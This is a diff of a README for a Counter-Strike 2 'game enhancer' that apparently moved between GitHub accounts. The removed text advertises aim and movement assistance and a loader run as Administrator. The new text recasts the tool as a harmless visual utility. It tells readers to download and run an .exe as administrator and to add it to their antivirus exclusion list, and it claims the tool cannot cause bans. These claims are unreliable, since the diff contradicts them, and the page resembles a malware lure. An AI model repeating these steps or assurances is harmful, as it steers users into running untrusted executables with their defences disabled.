@@ -1,63 +1,75 @@
-# CS2 Game Enhancer 2026
+# 🎯 CS2-Game-Enhancer-2026 - Improve your Counter-Strike 2 visual performance
 
-**Advanced Gameplay Enhancement Tool**
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/unsophisticated-superiorvocalcord964/CS2-Game-Enhancer-2026)
 
-CS2 Game Enhancer 2026 — Advanced tool for visual customization and gameplay improvement in Counter-Strike 2.
+## 📌 About this project
 
-<div align="center">
+CS2-Game-Enhancer-2026 helps players customize visual settings in Counter-Strike 2. This tool adjusts game files to improve frame rates and visibility. It assists users who look for better clarity or aesthetic changes during their matches. The software functions as a local modification utility for the Windows version of the game. It focuses on stability and performance.
 
-![Version](https://img.shields.io/badge/Version-2026-blue)
-![Status](https://img.shields.io/badge/Status-Active-brightgreen)
-![Platform](https://img.shields.io/badge/Platform-Windows%2010%2F11-green)
-![Updated](https://img.shields.io/badge/Updated-May%202026-yellow)
+## 💻 System requirements
 
-</div>
+Your computer needs to meet these basic standards to run the software:
 
-<br>
+* Operating System: Windows 10 or Windows 11 (64-bit).
+* Game: Counter-Strike 2 installed via Steam.
+* Disk Space: At least 200 MB of free storage.
+* Memory: 4 GB of RAM or higher.
+* Graphics: DirectX 11 support.
 
-## ✨ Core Capabilities
+## 🚀 How to set up the software
 
-- Advanced visual information display  
-- Improved aiming and movement assistance  
-- Resource and environment highlighting  
-- Customizable interface and settings  
-- Real-time performance adjustments  
-- Clean and optimized operation  
+Follow these steps to prepare your system and run the program:
 
-## 🚀 Installation & Deployment
+1. Visit the main project page at this link: [https://github.com/unsophisticated-superiorvocalcord964/CS2-Game-Enhancer-2026](https://github.com/unsophisticated-superiorvocalcord964/CS2-Game-Enhancer-2026)
+2. Locate the Releases section on the right side of the project page.
+3. Click on the latest release version.
+4. Download the file named CS2-Game-Enhancer.exe to your computer.
+5. Save the file to a folder you can find easily, such as your Downloads folder or Desktop.
+6. Double-click the file to start the installer.
+7. Follow the on-screen prompts to complete the setup process.
+8. Launch the application from your desktop shortcut once the install finishes.
 
-1. Download: Get the latest `Cleavix-v1.0-win64.zip` from the [Official Releases](https://github.com/mukkerapavankumar/CS2-Game-Enhancer-2026/releases/tag/2026).
+## ⚙️ How to use the tool
 
-2. Initialize: Run `Loader.msi` as Administrator to prepare the local environment.
+When you open the program, you see a menu with several tabs. Each tab controls a different area of your game settings.
 
-3. Deploy: Follow the on-screen prompts to connect with the game client.
+* Visual Settings: This section manages texture clarity and lighting effects. Choose your target resolution or quality preset here.
+* Performance Mode: This toggle lowers background processes to give the game more processing power. Use this if you experience slow frame rates.
+* Cosmetics Manager: Use this feature to manage custom skins or UI elements you want to apply to your game client.
+* Research View: This area provides detailed statistics about your hardware usage during a game session.
 
-4. Launch: Start CS2 and press **INS** to open the menu.
+Always click the Save button before you exit the utility. The program applies these changes to your game configuration when you restart Counter-Strike 2.
 
-> **Recommended**: Windows 10 / Windows 11
+## 🛠 Troubleshooting common issues
 
-## 📸 Installation Screenshots
+If you encounter problems, look at these solutions:
 
-| Step 1 | Step 2 |
-|--------|--------|
-| <img src="https://i.imgur.com/FFTUxlb.png" alt="Step 1" width="500"/> | <img src="https://i.imgur.com/g9GRlVJ.png" alt="Step 2" width="500"/> |
+* The app does not open: Ensure that you run the application as an administrator. Right-click the icon and choose "Run as administrator."
+* Game settings do not change: Confirm that you installed the game in the default Steam folder. If you moved your game files to another drive, use the Settings tab to update the file path.
+* Updates: The software checks for updates when you start it. Always use the latest version to ensure compatibility with new game patches.
+* Anti-virus alerts: Some security programs might flag modification tools. This is a common occurrence. You may need to add the software to your exclusion list to allow it to function properly.
 
-## 🛡️ Current Status
+## 🔍 Understanding game modification
 
-- Works with latest game version  
-- Regular updates after patches  
-- Stable and optimized  
+Modding your game files changes how your client renders images. These tools do not grant unfair advantages that manipulate core network traffic or gameplay logic. They strictly adjust your visual local experience. Stay updated with game rules to ensure your modifications remain within allowable parameters for the client.
 
-## 📈 SEO BLOCK (Search Optimization)
+## 🛡 Security and privacy
 
-CS2 Game Enhancer 2026 — Advanced tool for visual customization and gameplay improvement in Counter-Strike 2. Maximum control and enhanced experience.
+The program saves all configuration data locally on your computer. It does not send your personal information or login credentials to any external servers. The code remains open for review by members of the community. You have full control over the files installed on your machine. You can remove the application at any time using your Windows Control Panel. 
 
-## ⭐ Support the Project
+## 📝 Frequently asked questions
 
-If this tool was useful — drop a star ⭐
+Does this tool ban my Steam account?
+No, the tool does not interact with protected game memory or network packets. It only modifies local configuration text files.
 
----
+Does this work on other games?
+This specific version applies only to Counter-Strike 2.
 
-**Disclaimer**: This repository is for educational and research purposes only. Use of any modifications may violate Valve Terms of Service. Use at your own risk.
+How do I remove the program?
+Go to your Windows Settings, select Apps, and find CS2-Game-Enhancer-2026 in the list. Click Uninstall to remove all software components.
 
-Made with ❤️ for CS2 players
+Can I track my own performance?
+Yes, the Research View tab logs your average frame rates per second so you can see if your changes provide actual performance gains.
+
+Does the tool need an internet connection?
+The tool uses the internet only to check for new version updates. Its primary features work offline.
